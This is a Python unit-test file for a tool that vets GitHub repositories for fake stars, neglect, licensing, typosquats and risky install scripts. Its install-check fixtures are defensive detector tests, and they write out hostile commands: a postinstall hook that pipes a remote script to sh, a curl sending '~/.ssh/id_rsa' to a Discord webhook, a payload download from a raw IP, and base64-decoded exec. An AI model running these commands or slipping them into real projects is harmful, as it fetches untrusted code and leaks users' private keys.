"""Offline tests: checks are pure functions over fetched data."""

import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from repovet import checks  # noqa: E402
from repovet.cli import parse_target  # noqa: E402
from repovet.radar import detect_stack, rank  # noqa: E402
from repovet.vet import _star_page_numbers, analyze  # noqa: E402

NOW = datetime(2026, 11, 10, tzinfo=timezone.utc)


def iso(days_ago: float) -> str:
    return (NOW - timedelta(days=days_ago)).strftime("%Y-%m-%dT%H:%M:%SZ")


def make_repo(**over):
    repo = {
        "name": "widget", "full_name": "acme/widget", "html_url": "https://github.com/acme/widget",
        "description": "A fast widget toolkit for building dashboards",
        "stargazers_count": 5000, "forks_count": 500, "subscribers_count": 80,
        "created_at": iso(900), "pushed_at": iso(3), "archived": False, "disabled": False,
        "has_issues": True, "fork": False, "license": {"spdx_id": "MIT"},
        "default_branch": "main", "language": "Python", "topics": [],
        "owner": {"login": "acme", "type": "Organization"},
    }
    repo.update(over)
    return repo


def titles(findings):
    return [f.title for f in findings]


class StarChecks(unittest.TestCase):
    def test_healthy_repo_is_clean(self):
        self.assertEqual(checks.check_stars(make_repo(), 900, [], [], NOW), [])

    def test_no_forks_and_no_issues_flagged(self):
        repo = make_repo(stargazers_count=20000, forks_count=30, subscribers_count=5)
        found = titles(checks.check_stars(repo, 1, [], [], NOW))
        self.assertIn("Almost nobody forks it", found)
        self.assertIn("Almost nobody watches it", found)
        self.assertIn("Stars without users", found)

    def test_ghost_stargazers(self):
        ghost = {"starred_at": iso(1), "created_at": iso(2), "followers": 0, "public_repos": 0}
        real = {"starred_at": iso(1), "created_at": iso(2000), "followers": 40,
                "public_repos": 25}
        mostly_fake = checks.check_stars(make_repo(), 900, [], [ghost] * 60 + [real] * 40, NOW)
        self.assertEqual(mostly_fake[0].severity, "high")
        mostly_real = checks.check_stars(make_repo(), 900, [], [ghost] * 5 + [real] * 95, NOW)
        self.assertEqual(mostly_real, [])

    def test_star_burst(self):
        def page(start_days_ago, span_days):
            return [iso(start_days_ago - span_days * i / 99) for i in range(100)]
        steady = [page(300, 30), page(200, 30), page(100, 30)]
        self.assertIsNone(checks.star_burst(steady))
        spiky = [page(300, 30), page(200, 0.01), page(100, 30)]
        self.assertIsNotNone(checks.star_burst(spiky))

    def test_star_page_sampling(self):
        self.assertEqual(_star_page_numbers(0, 3), [])
        self.assertEqual(_star_page_numbers(150, 3), [1, 2])
        self.assertEqual(_star_page_numbers(10_000, 3), [1, 50, 100])
        self.assertEqual(_star_page_numbers(900_000, 3)[-1], 400)


class MaintenanceAndPeople(unittest.TestCase):
    def test_archived_and_stale(self):
        self.assertIn("Archived (read-only)",
                      titles(checks.check_maintenance(make_repo(archived=True), [], NOW)))
        self.assertIn("Stale",
                      titles(checks.check_maintenance(make_repo(pushed_at=iso(400)), [], NOW)))
        self.assertIn("Abandoned",
                      titles(checks.check_maintenance(make_repo(pushed_at=iso(900)), [], NOW)))

    def test_single_maintainer(self):
        commits = [{"author": {"login": "solo"}}] * 50
        found = checks.check_people(make_repo(), None, [{"login": "solo"}], commits, NOW)
        self.assertEqual(titles(found), ["Single maintainer"])

    def test_new_owner_with_big_repo(self):
        owner = {"type": "User", "created_at": iso(20), "public_repos": 1, "followers": 0}
        found = checks.check_people(make_repo(), owner, [], [], NOW)
        self.assertEqual(found[0].severity, "medium")


class LicenseChecks(unittest.TestCase):
    def test_license_cases(self):
        self.assertEqual(checks.check_license(make_repo()), [])
        self.assertEqual(checks.check_license(make_repo(license=None))[0].severity, "medium")
        self.assertEqual(
            checks.check_license(make_repo(license={"spdx_id": "AGPL-3.0"}))[0].severity, "info")
        self.assertEqual(
            checks.check_license(make_repo(license={"spdx_id": "NOASSERTION"}))[0].severity,
            "low")


class InstallChecks(unittest.TestCase):
    def test_pick_files(self):
        tree = ["README.md", "package.json", "src/package.json", "scripts/install.sh",
                "a/b/c/install.sh", "setup.py", "docs/readme.md"]
        self.assertEqual(checks.pick_files(tree),
                         ["README.md", "package.json", "scripts/install.sh", "setup.py"])

    def test_clean_files(self):
        files = {"README.md": "# Widget\n\npip install widget\n",
                 "package.json": '{"scripts": {"test": "jest", "build": "tsc"}}'}
        self.assertEqual(checks.check_install(["README.md", "src/a.py"], files), [])

    def test_risky_patterns(self):
        files = {
            "package.json": '{"scripts": {"postinstall": "curl http://x.io/a.sh | sh"}}',
            "setup.py": "import os\nos.system('whoami')\n",
            "install.sh": "curl -s https://discord.com/api/webhooks/1/abc -d @~/.ssh/id_rsa\n"
                          "wget http://45.33.12.9/payload\n",
            "README.md": "Download release.zip and extract. Password: 2026\n",
        }
        found = titles(checks.check_install(["tool.exe", "README.md"], files))
        for expected in ("Executables committed to the repo",
                         "npm postinstall hook runs on install",
                         "setup.py runs commands or network calls",
                         "Sends data to a Discord/Telegram webhook",
                         "Talks to a hard-coded IP address",
                         "README tells you to open a password-protected archive"):
            self.assertIn(expected, found)

    def test_readable_scripts_are_not_binaries(self):
        self.assertEqual(checks.check_install(["docs/make.bat", "run.cmd"], {}), [])

    def test_alternatives_drop_tiny_repos(self):
        hits = [{"full_name": "big/alt", "stargazers_count": 9000, "description": "x"},
                {"full_name": "tiny/noise", "stargazers_count": 7, "description": "y"},
                {"full_name": "acme/widget", "stargazers_count": 5000, "description": "me"}]
        self.assertEqual([a["full_name"] for a in checks.alternatives(make_repo(), hits)],
                         ["big/alt"])

    def test_obfuscated_exec(self):
        files = {"setup.py": "exec(base64.b64decode('aW1wb3J0IG9z'))"}
        self.assertIn("Runs obfuscated/decoded code",
                      titles(checks.check_install([], files)))


class IdentityChecks(unittest.TestCase):
    def test_typosquat_of_bigger_older_repo(self):
        repo = make_repo(full_name="evil/widget", stargazers_count=300, created_at=iso(20))
        original = {"name": "widget", "full_name": "acme/widget", "stargazers_count": 50000,
                    "created_at": iso(900),
                    "description": "A fast widget toolkit for building dashboards"}
        found = checks.check_identity(repo, [original])
        self.assertEqual(found[0].severity, "medium")
        self.assertIn("acme/widget", found[0].detail)

    def test_original_is_not_flagged_as_copy(self):
        copy = {"name": "Widget", "full_name": "evil/Widget", "stargazers_count": 10,
                "created_at": iso(5),
                "description": "A fast widget toolkit for building dashboards"}
        found = checks.check_identity(make_repo(), [copy])
        self.assertEqual([f.severity for f in found], ["info"])


class Scoring(unittest.TestCase):
    def test_verdicts(self):
        self.assertEqual(checks.score([]), (100, "LOOKS OK"))
        one_high = [checks.Finding("high", "stars", "x")]
        self.assertEqual(checks.score(one_high), (75, "CAUTION"))
        self.assertEqual(checks.score(one_high * 2)[1], "HIGH RISK")

    def test_analyze_end_to_end(self):
        data = {"repo": make_repo(), "errors": [], "owner": None,
                "commits": [{"author": {"login": f"dev{i % 7}"}} for i in range(100)],
                "contributors": [{"login": f"dev{i}"} for i in range(40)],
                "releases": [{"tag_name": "v2.1.0"}], "last_issue": [{"number": 1400}],
                "star_pages": [], "profiles": [], "name_hits": [], "topic_hits": [],
                "tree_paths": ["README.md"], "files": {"README.md": "# Widget"}}
        report = analyze(data, authenticated=False, now=NOW)
        self.assertEqual(report["verdict"], "LOOKS OK")
        self.assertEqual(report["facts"]["issues_and_prs_ever"], 1400)
        self.assertEqual(report["facts"]["latest_release"], "v2.1.0")


class CliAndRadar(unittest.TestCase):
    def test_parse_target(self):
        self.assertEqual(parse_target("psf/requests"), ("psf", "requests"))
        self.assertEqual(parse_target("https://github.com/psf/requests.git"),
                         ("psf", "requests"))
        self.assertEqual(parse_target("github.com/psf/requests/tree/main/src"),
                         ("psf", "requests"))
        with self.assertRaises(ValueError):
            parse_target("requests")
        with self.assertRaises(ValueError):
            parse_target("a/b c")

    def test_detect_stack(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"dependencies": {"react": "^19", "next": "15"},'
                ' "devDependencies": {"typescript": "5"}}', encoding="utf-8")
            (root / "requirements.txt").write_text("fastapi==0.115\ntorch>=2\n",
                                                   encoding="utf-8")
            languages, topics = detect_stack(root)
        self.assertEqual(languages, ["TypeScript", "Python"])
        self.assertEqual(topics, ["react", "nextjs", "fastapi", "pytorch"])

    def test_rank_collapses_clones_and_penalizes_hollow_stars(self):
        def item(full_name, stars, forks, age):
            return {"name": full_name.split("/")[1], "full_name": full_name,
                    "stargazers_count": stars, "forks_count": forks, "created_at": iso(age),
                    "description": "thing", "license": {"spdx_id": "MIT"}}
        rows = rank([item("a/tool", 900, 90, 10), item("b/Tool", 200, 5, 4),
                     item("c/hollow", 1000, 2, 10)], NOW)
        self.assertEqual([r["full_name"] for r in rows], ["a/tool", "c/hollow"])
        self.assertIn("+1 same-name clone(s) hidden", rows[0]["flags"])
        self.assertIn("few forks", rows[1]["flags"])


if __name__ == "__main__":
    unittest.main()
